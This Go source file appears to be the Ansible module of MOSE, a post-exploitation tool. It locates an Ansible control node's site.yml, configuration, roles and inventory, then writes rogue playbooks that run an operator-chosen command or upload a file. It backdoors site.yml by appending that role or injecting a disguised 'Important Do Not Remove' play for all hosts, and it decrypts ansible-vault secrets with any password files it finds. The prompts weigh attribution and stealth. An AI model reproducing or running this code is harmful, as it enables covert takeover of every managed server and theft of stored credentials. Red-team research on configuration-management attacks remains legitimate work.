// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"flag"
	"fmt"
	"github.com/CrimsonK1ng/mose/pkg/moseutils"
	"github.com/ghodss/yaml"
	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
)

type command struct {
	Cmd      string
	CmdName  string
	FileName string
	FilePath string
}

type ansibleFiles struct {
	cfgFile      string
	hostFiles    []string
	hosts        []string
	playbookDirs []string
	siteFile     string
	vaultFile    string
}

type ansible []struct {
	Name   string        `json:"name,omitempty"`
	Hosts  string        `json:"hosts,omitempty"`
	Become bool          `json:"become,omitempty"`
	Roles  []string      `json:"roles,flow,omitempty"`
	Tasks  []interface{} `json:"tasks,omitempty"`
}

var (
	a                = CreateAgent()
	ansibleBackupLoc = a.AnsibleBackupLoc
	cleanup          bool
	cleanupFile      = a.CleanupFile
	debug            = a.Debug
	files            = ansibleFiles{
		cfgFile:      "",
		hostFiles:    []string{},
		playbookDirs: []string{},
		siteFile:     "",
		vaultFile:    "",
	}
	osTarget       = a.OsTarget
	ansibleRole    = a.PayloadName
	uploadFileName = a.FileName
	uploadFilePath = a.RemoteUploadFilePath
	specific       bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.Parse()
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if ansibleBackupLoc != "" {
		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		log.Printf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func getSiteFile() string {
	var siteLoc string
	fileList, _ := moseutils.GetFileAndDirList([]string{"/"})
	for _, file := range fileList {
		if strings.Contains(file, "site.yml") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			siteLoc = file
		}
	}
	if siteLoc == "" {
		moseutils.ErrMsg("Unable to locate a site.yml file.")
	}
	return siteLoc
}

func getCfgFile() string {
	var cfgLoc string
	fileList, _ := moseutils.GetFileAndDirList([]string{"/"})
	for _, file := range fileList {
		matched, _ := regexp.MatchString(`ansible.cfg$`, file)
		if matched && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") &&
			!strings.Contains(file, "test") {
			cfgLoc = file
		}
	}
	if cfgLoc == "" {
		moseutils.ErrMsg("Unable to locate an ansible.cfg file.")
	}
	return cfgLoc
}

func getPlaybooks() []string {
	locations := make(map[string]bool)
	var playbookDirs []string

	_, dirList := moseutils.GetFileAndDirList([]string{"/"})
	for _, dir := range dirList {
		d := filepath.Dir(dir)
		if strings.Contains(d, "roles") && !strings.Contains(d, "~") &&
			!strings.Contains(d, ".bak") && !strings.Contains(d, "#") &&
			!strings.Contains(d, "tasks") && !strings.Contains(d, "vars") {

			if !locations[d] && filepath.Base(d) == "roles" {
				locations[d] = true
			}
		}
	}
	for loc := range locations {
		playbookDirs = append(playbookDirs, loc)
	}

	return playbookDirs
}

func getHostFileFromCfg() (bool, string) {
	cfgFile, err := moseutils.File2lines(files.cfgFile)
	if err != nil {
		log.Printf("Unable to read %v because of %v", files.cfgFile, err)
	}
	for _, line := range cfgFile {
		matched, _ := regexp.MatchString(`^inventory.*`, line)
		if matched {
			if debug {
				log.Printf("Found inventory specified in ansible.cfg: %v", files.cfgFile)
			}
			inventoryPath := strings.TrimSpace(strings.SplitAfter(line, "=")[1])
			path, err := moseutils.CreateFilePath(inventoryPath, filepath.Dir(files.cfgFile))
			if err != nil {
				log.Printf("Unable to generate correct path from input: %v %v", inventoryPath, filepath.Dir(files.cfgFile))
			}
			return true, path
		}
	}
	return false, ""
}

// TODO: Account for multiple hosts files
func getHostFiles() []string {
	var hostFiles []string

	// Check if host file specified in the ansible.cfg file
	found, hostFile := getHostFileFromCfg()
	if found {
		hostFiles = append(hostFiles, hostFile)
	}

	fileList, _ := moseutils.GetFileAndDirList([]string{"/etc/ansible"})
	for _, file := range fileList {
		if strings.Contains(file, "hosts") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			hostFiles = append(hostFiles, file)
		}
	}
	return hostFiles
}

func getManagedSystems() []string {
	var hosts []string
	for _, hostFile := range files.hostFiles {
		// Get the contents of the hostfile into a slice
		contents, err := moseutils.File2lines(hostFile)
		if err != nil {
			log.Printf("Unable to read %v because of %v", hostFile, err)
		}
		// Add valid lines with IP addresses or hostnames to hosts
		for _, line := range contents {
			ip, _ := regexp.MatchString(`^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$`, line)
			validHostname, _ := regexp.MatchString(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`, line)
			if ip || validHostname {
				hosts = append(hosts, line)
			}
		}
	}
	return hosts
}

func createPlaybookDirs(playbookDir string, ansibleCommand command) {
	var err error
	var fileDir string
	err = os.MkdirAll(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks"), os.ModePerm)

	if err != nil {
		log.Fatalf("Error creating the %s playbook directory: %v", playbookDir, err)
	}

	if uploadFileName != "" {
		fileDir = filepath.Join(playbookDir, ansibleCommand.CmdName, "files")
		err = os.MkdirAll(fileDir, os.ModePerm)

		if err != nil {
			log.Fatalf("Error creating the %s playbook directory: %v", fileDir, err)
		}

		_, err := moseutils.TrackChanges(cleanupFile, uploadFilePath)

		if err != nil {
			log.Println("Error tracking changes: ", err)
		}

		moseutils.CpFile(uploadFilePath, filepath.Join(fileDir, filepath.Base(uploadFileName)))
		if err := os.Chmod(filepath.Join(fileDir, filepath.Base(uploadFileName)), 0644); err != nil {
			log.Fatal(err)
		}
		moseutils.Msg("Successfully copied and chmod file %s", filepath.Join(fileDir, filepath.Base(uploadFileName)))
	}
}

func backupSiteFile() {
	path := files.siteFile
	// If a backup location is specified in the settings.json, use it
	if ansibleBackupLoc != "" {
		var err error
		err = os.MkdirAll(ansibleBackupLoc, os.ModePerm)

		if err != nil {
			log.Fatalf("Error creating the path (%s) for the backup: %v", path, err)
		}

		path = filepath.Join(ansibleBackupLoc, filepath.Base(files.siteFile))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(files.siteFile, path+".bak.mose")
	} else {
		moseutils.ErrMsg("Backup of the (%v.bak.mose) already exists.", path)
	}
}

func generatePlaybooks() {
	ansibleCommand := command{
		CmdName:  a.PayloadName,
		Cmd:      a.Cmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}
	for _, playbookDir := range files.playbookDirs {
		var s string
		createPlaybookDirs(playbookDir, ansibleCommand)

		box := packr.New("Ansible", "../../../templates/ansible")

		s, err := box.FindString("ansiblePlaybook.tmpl")

		if err != nil {
			log.Fatalf("Error reading the template to create a playbook: %v", err)
		}

		// TODO: Implement this
		if uploadFileName != "" {
			s, err = box.FindString("ansibleFileUploadPlaybook.tmpl")

			if err != nil {
				log.Fatalf("Error reading the template to create a playbook: %v", err)
			}
		}

		// Parse the template
		t, err := template.New("ansiblePlaybook").Parse(s)

		if err != nil {
			log.Fatalf("Error creating the template representation of the ansible playbook: %v", err)
		}

		// Create the main.yml file
		f, err := os.Create(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks", "main.yml"))

		if err != nil {
			log.Fatalln(err)
		}

		// Write the contents of ansibleCommand into the main.yml file generated previously
		err = t.Execute(f, ansibleCommand)

		if err != nil {
			log.Fatalf("Error injecting the ansibleCommand content into the playbook template: %v", err)
		}

		f.Close()
		if debug {
			log.Printf("Creating rogue playbook %s", playbookDir)
		}
		moseutils.Msg("Successfully created the %s playbook at %s", ansibleCommand.CmdName, playbookDir)
	}
}

// TODO: this
func backdoorSiteFile() {
	bytes, err := moseutils.ReadBytesFromFile(files.siteFile)

	if err != nil {
		log.Fatal(err)
	}

	unmarshalled := ansible{}
	err = yaml.Unmarshal(bytes, &unmarshalled)
	if err != nil {
		log.Fatal(err)
	}

	var hosts []string
	hostAllFound := false

	for _, host := range unmarshalled {
		hosts = append(hosts, host.Hosts)
		if strings.Compare(host.Hosts, "all") == 0 {
			hostAllFound = true
		}
	}

	if hostAllFound {
		log.Println("hosts:all found")
		if ans, err := moseutils.AskUserQuestion("Backdoor the step containing hosts:all?", a.OsTarget); ans && err == nil {
			for i, item := range unmarshalled {
				if strings.Compare(item.Hosts, "all") == 0 {

					log.Printf("'Hosts: all' found, appending playbook to roles")
					if unmarshalled[i].Roles == nil {
						unmarshalled[i].Roles = make([]string, 0)
					}
					unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
					writeYamlToSite(unmarshalled)
					return
				}
			}
		} else if err != nil {
			log.Fatalf("Quitting...")
		}
	}

	if !hostAllFound {
		log.Println("No hosts:all found in site.yml")
		if ans, err := moseutils.AskUserQuestion("Would you like to inject a hosts: all into the site.yml?", a.OsTarget); ans && err == nil {
			newItem := ansible{{
				"Important Do Not Remove",
				"all",
				true,
				[]string{ansibleRole},
				nil,
			}}
			unmarshalled = append(unmarshalled, newItem[0])
			writeYamlToSite(unmarshalled)
			return
		} else if err != nil {
			log.Fatalf("Quitting...")
		}
	}
	moseutils.Msg("The following steps were found in the site.yml file:")

	for i, hosts := range unmarshalled {
		moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, hosts.Roles)
	}

	if ans, err := moseutils.AskUserQuestionCommaIndex("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget); err == nil {
		for i, _ := range unmarshalled {
			if ans[i] { // Check if current step in answer
				if unmarshalled[i].Roles == nil {
					unmarshalled[i].Roles = make([]string, 0)
				}
				unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
			}
		}
	} else if err != nil {
		log.Fatalf("Quitting...")
	}
	writeYamlToSite(unmarshalled)

	// find the hosts: all section
	// if it doesn't exist, create it
	// make sure to put the backdoor at the bottom of roles
	// be sure to support cases like this: https://raw.githubusercontent.com/l50/ansible-docker-compose/master/ansible/site.yml
	// where there are no roles
	// if there are no roles, then add a roles section to the yaml file under the hosts: all section
	// files to test with:
	// https://raw.githubusercontent.com/l50/ansible-docker-compose/master/ansible/site.yml
	// https://raw.githubusercontent.com/ansible/ansible-examples/master/mongodb/site.yml
	// https://github.com/ansible/ansible-examples/blob/master/lamp_haproxy/site.yml
}

func findVaultSecrets() {
	found, fileLoc := moseutils.FindFile("ansible-vault", []string{"/bin", "/usr/bin", "/usr/local/bin", "/etc/anisble"})
	if found {
		envPass := os.Getenv("ANSIBLE_VAULT_PASSWORD_FILE")
		envFileExists, envFile := getVaultPassFromCfg()

		ansibleFiles, _ := moseutils.FindFiles([]string{"/etc/ansible", "/root", "/home", "/opt", "/var"}, []string{".yaml", ".yml"}, []string{"vault"}, []string{}, debug)

		if len(ansibleFiles) == 0 {
			log.Println("Unable to find any yaml files")
			return
		}
		// Matches for secrets
		reg := regexp.MustCompile(`(?ms)\$ANSIBLE_VAULT`)
		var matches []string
		// Translate secrets on the fly
		log.Println(fileLoc)
		for _, file := range ansibleFiles {
			// Grep for ENC[
			log.Printf("Attempting viewing of %v", file)
			matches = moseutils.GrepFile(file, reg)
			if len(matches) > 0 {
				if envPass != "" {
					moseutils.Msg("Found secret(s) in file: %s", file)
					res, err := utils.RunCommand(fileLoc, "view",
						"--vault-password-file",
						envPass,
						file)

					if err != nil {
						log.Printf("Error running command: %s view %s %s %v", fileLoc, envPass, file, err)
					}
					if !strings.Contains(res, "ERROR!") {
						moseutils.Msg("%s", res)
					}
				}

				if envFileExists && envFile != envPass {
					moseutils.Msg("Found secret(s) in file: %s", file)
					res, err := utils.RunCommand(fileLoc, "view",
						"--vault-password-file",
						envFile,
						file)

					if err != nil {
						log.Printf("Error running command: %s view --vault-password-file %s %s %v", fileLoc, envFile, file, err)
					}
					if !strings.Contains(res, "ERROR!") {
						moseutils.Msg("%s", res)
					}
				}
			}
		}
	}
}

func getVaultPassFromCfg() (bool, string) {
	cfgFile, err := moseutils.File2lines(files.cfgFile)
	if err != nil {
		log.Printf("Unable to read %v because of %v", files.cfgFile, err)
	}
	for _, line := range cfgFile {
		matched, _ := regexp.MatchString(`^vault_password_file.*`, line)
		if matched {
			if debug {
				log.Printf("Found vault_password_file specified in ansible.cfg: %v", files.cfgFile)
			}
			vaultPath := strings.TrimSpace(strings.SplitAfter(line, "=")[1])
			path, err := moseutils.CreateFilePath(vaultPath, filepath.Dir(files.cfgFile))
			if err != nil {
				log.Printf("Unable to generate correct path from input: %v %v", vaultPath, filepath.Dir(files.cfgFile))
			}
			return true, path
		}
	}
	return false, ""
}

func writeYamlToSite(siteYaml ansible) {
	marshalled, err := yaml.Marshal(&siteYaml)
	if err != nil {
		log.Fatal(err)
	}

	err = moseutils.WriteFile(files.siteFile, marshalled, 0644)
	if err != nil {
		log.Fatalf("error: %v", err)
	}
	log.Printf("%s successfully created", files.siteFile)
}

func main() {
	// TODO: Implement cleanup
	if cleanup {
		doCleanup(files.siteFile)
	}

	if uploadFilePath != "" {
		moseutils.CpFile(uploadFileName, uploadFilePath)
		_, err := moseutils.TrackChanges(cleanupFile, uploadFileName)

		if err != nil {
			log.Println("Error tracking changes: ", err)
		}
	}

	// Find site.yml
	files.siteFile = getSiteFile()
	if debug {
		log.Printf("Site file: %v", files.siteFile)
	}

	// Find ansible.cfg
	files.cfgFile = getCfgFile()
	if debug {
		log.Printf("Ansible config file location: %v", files.cfgFile)
	}

	// Find where playbooks are located on the target system
	files.playbookDirs = getPlaybooks()
	if debug {
		log.Printf("Directories with playbooks: %v", files.playbookDirs)
	}

	// Find host files
	files.hostFiles = getHostFiles()
	if debug {
		log.Printf("Host files found: %v", files.hostFiles)
	}

	// Parse managed systems from the hosts files found previously
	files.hosts = getManagedSystems()
	if debug {
		log.Printf("Managed systems found: %v", files.hosts)
	}

	if files.siteFile != "" {
		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
			backupSiteFile()
		} else if err != nil {
			log.Fatalf("Error backing up %s: %v, exiting...", files.siteFile, err)
		}
	}

	// Create rogue playbooks using ansiblePlaybook.tmpl
	generatePlaybooks()

	// TODO: Need to implement message for file uploads
	moseutils.Msg("Backdooring %s to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
	// TODO: implement this
	backdoorSiteFile()

	// find secrets is ansible-vault is installed
	moseutils.Info("Attempting to find secrets, please wait...")
	// TODO: Implement this
	findVaultSecrets()
	moseutils.Msg("MOSE has finished, exiting.")
	os.Exit(0)

}
